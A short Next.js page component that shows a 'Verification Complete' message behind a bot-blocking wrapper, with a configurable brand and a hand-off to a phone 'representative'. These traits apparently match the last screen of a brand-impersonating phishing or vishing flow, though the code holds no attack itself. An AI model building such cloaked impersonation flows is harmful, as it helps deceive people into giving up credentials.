'use client';
import { BotGuard } from '@/components/security/BotGuard';
import { currentBrand } from '@/config/branding';
import { CheckCircle } from 'lucide-react';

export default function CompletedPage() {
  return (
    <BotGuard>
      <div className="card">
        <h1 className="card__title">Verification Complete</h1>

        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '16px', textAlign: 'center' }}>
          <CheckCircle className="h-16 w-16 text-green-600" />

          <p style={{ fontSize: '16px', fontWeight: 'bold' }}>
            Thank you for verifying your identity.
          </p>

          <p style={{ fontSize: '14px' }}>
            Your account has been secured. You may safely close this window.
          </p>

          <p style={{ fontSize: '14px', marginTop: '12px' }}>
            If you were on a call with a representative, they will guide you through the next steps.
          </p>
        </div>
      </div>
    </BotGuard>
  );
}
